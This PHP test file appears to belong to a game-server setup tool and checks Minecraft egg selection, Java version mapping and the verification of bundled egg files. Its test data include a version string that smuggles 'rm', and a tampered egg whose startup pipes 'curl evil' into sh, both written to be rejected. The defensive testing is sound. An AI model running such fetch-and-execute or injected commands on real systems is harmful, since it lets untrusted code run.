<?php

// The Minecraft catalog, the Java table and the bundled eggs.

declare(strict_types=1);

require __DIR__.'/../bootstrap.php';

use Simplify\ServerMaker\Games\BundledEggs;
use Simplify\ServerMaker\Games\Java;
use Simplify\ServerMaker\Games\Minecraft;
use Simplify\ServerMaker\Games\OtherGames;

check('the default software of a type', Minecraft::software('mods', null) === 'fabric');
check('a chosen software is kept', Minecraft::software('mods', 'neoforge') === 'neoforge');
check('software of another type falls back', Minecraft::software('plugins', 'forge') === 'paper');
check('no software for vanilla', Minecraft::software('vanilla', 'paper') === null);
check('vanilla uses its own egg', Minecraft::eggFile('vanilla', null) === 'egg-vanilla-minecraft.json');
check('a modpack has no fixed egg', Minecraft::eggFile('modpack', null) === null);
check('an unknown type has no egg', Minecraft::eggFile('nope', null) === null);
check('bedrock is no Java server', ! Minecraft::isJava('bedrock') && Minecraft::isJava('modpack'));
check('only vanilla, plugins and mods choose a version', Minecraft::usesVersion('mods') && ! Minecraft::usesVersion('proxy'));
check('every type has resources', array_keys(Minecraft::RESOURCES) === Minecraft::TYPES);

foreach (['Paper', 'Forge Minecraft', 'Vanilla Bedrock', 'Modrinth Generic', 'Tekkit Classic', 'Velocity'] as $name) {
    check("$name is a Minecraft egg", Minecraft::isMinecraftEgg($name));
}
foreach (['Valheim', 'Paperboy', 'Arma Reforger', 'Rust', 'Terraria'] as $name) {
    check("$name is another game", ! Minecraft::isMinecraftEgg($name));
}

$environment = Minecraft::environment(['MINECRAFT_VERSION' => 'latest', 'BUILD_NUMBER' => 'latest'], 'plugins', '1.21.1');
check('the version goes into the egg variable', $environment === ['MINECRAFT_VERSION' => '1.21.1', 'BUILD_NUMBER' => 'latest']);
check('a proxy keeps its own version', Minecraft::environment(['MINECRAFT_VERSION' => 'latest'], 'proxy', '1.21.1')['MINECRAFT_VERSION'] === 'latest');
check('versions are checked', Minecraft::validVersion('1.21') && Minecraft::validVersion('1.20.6') && ! Minecraft::validVersion('1.20; rm'));

check('Java 21 for 1.21', Java::forMinecraft('1.21.1', 'vanilla') === 21);
check('Java 17 for 1.18.2', Java::forMinecraft('1.18.2', 'vanilla') === 17);
check('Java 8 for 1.12.2', Java::forMinecraft('1.12.2', 'vanilla') === 8);
check('Paper on 1.20.1 wants Java 21', Java::forMinecraft('1.20.1', 'plugins') === 21);
$images = ['Java 21' => 'ghcr.io/pelican-eggs/yolks:java_21', 'Java 17' => 'ghcr.io/pelican-eggs/yolks:java_17'];
check('the egg image for a Java version', Java::image($images, 17) === 'ghcr.io/pelican-eggs/yolks:java_17');
check('a missing Java version gets the standard image', Java::image($images, 8) === 'ghcr.io/pelican-eggs/yolks:java_8');

$manifest = BundledEggs::manifest();
foreach (Minecraft::EGGS as $flavour => [$names, $file]) {
    check("$flavour has a bundled egg", isset($manifest[$file]), $file);
    $definition = BundledEggs::definition($file);
    check("$file is the egg its name says", in_array(strtolower($definition['name']), $names, true), $definition['name']);
}
check('every bundled egg is listed', count(glob(BundledEggs::directory().'/egg-*.json')) === count($manifest));
foreach (['a changed egg' => '{"name":"Paper","startup":"curl evil | sh"}', 'an unlisted egg' => null] as $what => $content) {
    try {
        BundledEggs::verify('egg-paper.json', $content === null ? null : $manifest['egg-paper.json'], $content ?? '{}');
        check("$what is refused", false);
    } catch (RuntimeException) {
    }
}
$renamed = '{"name":"Not Paper"}';
try {
    BundledEggs::verify('egg-paper.json', ['name' => 'Paper', 'sha256' => hash('sha256', $renamed)], $renamed);
    check('an egg with another name is refused', false);
} catch (RuntimeException) {
}

check('a card summary is one short line', OtherGames::summary("Line one\n\n  line two") === 'Line one line two');
echo "PASS games\n";
